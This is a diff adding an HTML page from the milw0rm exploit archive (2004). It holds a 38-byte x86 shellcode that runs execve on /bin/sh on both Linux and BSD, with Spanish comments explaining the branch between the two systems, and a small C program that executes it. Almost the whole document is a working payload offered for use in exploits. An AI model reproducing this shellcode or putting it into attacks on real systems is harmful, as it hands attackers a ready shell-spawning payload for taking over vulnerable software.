@@ -1,0 +1,41 @@
+<html><head><title>linux/x86 bsd/x86 execve /bin/sh 38 bytes</title></head><pre>/*
+ *  Linux/x86 and Bsd/x86
+ *
+ *   execve() of /bin/sh by dymitri!!!
+ *
+ */
+
+
+
+#include &lt;stdio.h&gt;
+char
+code[] =
+        &quot;\x31\xc0&quot;  
+        &quot;\x50&quot;                                 
+        &quot;\x68\x2f\x2f\x73\x68&quot;                  
+        &quot;\x68\x2f\x62\x69\x6e&quot;                  
+        &quot;\x89\xe3&quot;                              
+        &quot;\x50&quot;                                 
+        &quot;\x54&quot;                                  
+        &quot;\x53&quot;                                  
+        &quot;\x50&quot;                                 
+        &quot;\x8c\xe0&quot;              
+        &quot;\x21\xc0&quot;             
+        &quot;\x74\x04&quot;                                 
+        &quot;\xb0\x3b&quot;              
+        &quot;\xeb\x07&quot; /* si es bsd saltamos los 7 bytes para llegar al int $0x80 */                       
+        &quot;\xb0\x0b&quot;
+        &quot;\x99&quot;     /* En caso contrario si %fs es igual a 0 configuramos para que la ejecucion sea sobre linux */                  
+        &quot;\x52&quot;                          
+        &quot;\x53&quot;                         
+        &quot;\x89\xe1&quot;                      
+        &quot;\xcd\x80&quot;;             
+main()
+{
+  void (*s)() = (void *)code;
+  printf(&quot;Shellcode length: %d\nExecuting..\n\n&quot;,
+      strlen(code));
+  s();
+}
+
+// milw0rm.com [2004-09-12]</pre></html>
